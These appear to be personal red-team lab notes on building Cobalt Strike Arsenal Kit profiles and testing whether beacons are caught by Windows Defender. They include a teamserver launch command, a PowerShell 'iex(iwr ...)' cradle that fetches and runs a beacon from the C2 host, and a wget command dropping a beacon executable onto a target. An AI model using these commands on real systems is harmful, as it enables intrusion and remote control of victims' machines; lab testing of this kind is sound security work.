##### Goals
-  Properly have both `No-AV-BYPASS` & `AV-BYPASS` arsenal kit profiles work

#### Creation of `arsenal_kit-NO-AV-BYPASS.cna`
Fresh `4.11` Cobaltstrike & Arsenal Kit placed on Desktop 
![[Pasted image 20250403170244.png]]
Unzipped with `tar -xvzf arsenal-kit20250310.tgz` - going to delete the `.tgz` files
![[Pasted image 20250403170435.png]]
moving `arsenal-kit` into `cobaltstrike`, need to enable `networking` to update the cobaltstrike
![[Pasted image 20250403181641.png]]
Building `arsenal_kit` without modifications

![[Pasted image 20250403182633.png]]
making sure it wa sproperly created and renaming to `arsenal_kit-NO-AV-BYPASS.cna`
![[Pasted image 20250403182809.png]]
copying to `/home/kali/tools/cobaltstrike_4.11/cobaltstrike/arsenal-kit/dist/`
![[Pasted image 20250403182948.png]]
placing [[11.  .aggressor.prop modifications (DEPRECATED)]] in `/home/kali/tools/cobaltstrike_4.11/cobaltstrike/client`
Properly moved the tested `4.11` build into `/opt/cobaltstrike` the correct location
![[Pasted image 20250403184428.png]]  
changing networking to `host only` 
```bash
./teamserver 192.168.127.129 passphrase /opt/cobaltstrike/custom-cobalt/Profiles/custom.profile
```
loading the proper `aggressor script` and `unloading` the old
![[Pasted image 20250403190740.png]]restarting the `teams server` and seeing if it was loaded - was properly loaded
![[Pasted image 20250403191209.png]]
now  testing to see if able to catch `beacons` with `artifact-kit` & `resource-kit`

#### resource kit `NO-AV-BYPASS`
starting `http` listener
![[Pasted image 20250403191830.png]]starting `web delivery` and hosting at `/artifactkit`
![[Pasted image 20250403210941.png]]
making sure `windows defender` is turned off
![[Pasted image 20250403211101.png]]
using this payload to kick off beacon `iex(iwr http://192.168.127.129/artifactkit -useb)`
![[Pasted image 20250403211147.png]]
caught `beacon` 
![[Pasted image 20250403211434.png]]
now going to turn on defender to see if it gets caught
![[Pasted image 20250403211606.png]]
ok cool it got blocked, so working as intended
![[Pasted image 20250403211800.png]]

#### artifact kit `NO-AV-BYPASS`

generating `HTTP` payload
![[Pasted image 20250403212215.png]]
hosting file at `/a`
![[Pasted image 20250403212250.png]]
dropping straight onto `GUARDIAN DESKTOP` first with Defender off `wget http://192.168.127.129:80/a -UseBasicP -OutFile "C:\Users\blaster\Desktop\artifacttest.exe"` to make sure that the beacon works.
![[Pasted image 20250403212529.png]]
`DOUBLE CLICKING` beacon to make sure it works. Caught the beacon.
![[Pasted image 20250403212601.png]]
turning on `DEFENDER` to make sure it gets caught

![[Pasted image 20250403212951.png]]
was able to pull over file
![[Pasted image 20250403213029.png]]
was able to catch beacon ...
![[Pasted image 20250403213117.png]]
the reason is because i forgot to get a default `patch.c`, `bypass-pipe.c` file and recompile it,
